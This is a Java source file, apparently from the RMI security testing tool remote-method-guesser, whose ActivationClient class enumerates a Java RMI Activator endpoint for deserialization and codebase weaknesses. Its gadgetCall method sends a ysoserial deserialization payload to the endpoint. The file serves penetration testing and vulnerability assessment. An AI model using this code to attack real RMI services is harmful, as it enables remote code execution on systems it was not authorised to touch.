package de.qtc.rmg.operations;

import java.rmi.server.ObjID;

import de.qtc.rmg.internal.ExceptionHandler;
import de.qtc.rmg.io.Logger;
import de.qtc.rmg.io.MaliciousOutputStream;
import de.qtc.rmg.networking.RMIWhisperer;
import de.qtc.rmg.utils.DefinitelyNonExistingClass;

public class ActivationClient {

    private RMIWhisperer rmi;

    private static final long methodHash = -8767355154875805558L;
    private static final ObjID objID = new ObjID(ObjID.ACTIVATOR_ID);

    public ActivationClient(RMIWhisperer rmiRegistry)
    {
        this.rmi = rmiRegistry;
    }

    public void enumActivator()
    {
        Logger.printlnBlue("RMI ActivationSystem enumeration:");
        Logger.println("");
        Logger.increaseIndent();

        try {
            activateCall(new Object[] {"", false}, false);

        } catch( Exception e ) {

            if( e instanceof java.rmi.NoSuchObjectException ) {
                Logger.printMixedYellow("- Caught", "NoSuchObjectException", "during activate call ");
                Logger.printlnPlainYellow("(activator not present).");
                Logger.statusDefault();

            } else if( e instanceof java.lang.IllegalArgumentException ) {
                Logger.printMixedYellow("- Caught", "IllegalArgumentException", "during activate call ");
                Logger.printlnPlainYellow("(activator is present).");
                Logger.printMixedBlue("  --> Deserialization", "allowed");
                Logger.printlnPlainMixedRed("\t - Vulnerability Status:", "Vulnerable");
                this.enumCodebase();


            } else {
                ExceptionHandler.unexpectedException(e, "ActivationSystem", "enumeration", false);
            }

        } finally {
            Logger.decreaseIndent();
            MaliciousOutputStream.resetDefaultLocation();
        }
    }

    public void enumCodebase()
    {
        try {
            MaliciousOutputStream.setDefaultLocation("InvalidURL");
            activateCall(new Object[] {new DefinitelyNonExistingClass(), false}, true);

        } catch( java.rmi.ServerException e ) {

            Throwable t = ExceptionHandler.getCause(e);
            Throwable c = ExceptionHandler.getThrowable("ClassNotFoundException", e);

            if( c != null ) {

                if( c.getMessage().equals("de.qtc.rmg.utils.DefinitelyNonExistingClass")) {
                    Logger.printMixedBlue("  --> Client codebase", "disabled");
                    Logger.printlnPlainMixedGreen("\t - Configuration Status:", "Current Default");
                    ExceptionHandler.showStackTrace(e);

                } else {
                    ExceptionHandler.unexpectedException(e, "codebase", "enumeration", false);
                }

            } else if( t instanceof java.net.MalformedURLException) {
                Logger.printMixedBlue("  --> Client codebase", "enabled");
                Logger.printlnPlainMixedRed("\t - Configuration Status:", "Non Default");
                ExceptionHandler.showStackTrace(e);

            } else {
                ExceptionHandler.unexpectedException(e, "codebase", "enumeration", false);
            }

        } catch( Exception e ) {
            ExceptionHandler.unexpectedException(e, "codebase", "enumeration", false);

        } finally {
            Logger.decreaseIndent();
            MaliciousOutputStream.resetDefaultLocation();
        }
    }

    public void gadgetCall(Object payloadObject)
    {
        try {
            Logger.printlnBlue("Attempting ysoserial attack on Activator endpoint...");
            Logger.println("");
            Logger.increaseIndent();

            activateCall(new Object[] {payloadObject, false}, false);

        } catch( java.rmi.ServerException e ) {

            Throwable cause = ExceptionHandler.getCause(e);

            if( cause instanceof java.io.InvalidClassException ) {
                ExceptionHandler.invalidClass(e, "Activator", "gadget-class");

            } else if( cause instanceof java.lang.ClassNotFoundException) {
                ExceptionHandler.deserializeClassNotFound(e);

            } else if( cause instanceof java.lang.ClassCastException) {
                ExceptionHandler.deserlializeClassCast(e, false);

            } else {
                ExceptionHandler.unknownDeserializationException(e);
            }

        } catch( java.lang.ClassCastException e ) {
            ExceptionHandler.deserlializeClassCast(e, false);

        } catch( java.lang.IllegalArgumentException e ) {
            ExceptionHandler.illegalArgument(e);

        } catch( Exception e ) {
            ExceptionHandler.unexpectedException(e, "activate", "call", false);
        }
    }

    private void activateCall(Object[] callArguments, boolean maliciousStream) throws Exception
    {
        rmi.genericCall(objID, -1, methodHash, callArguments, maliciousStream, "activate");
    }
}
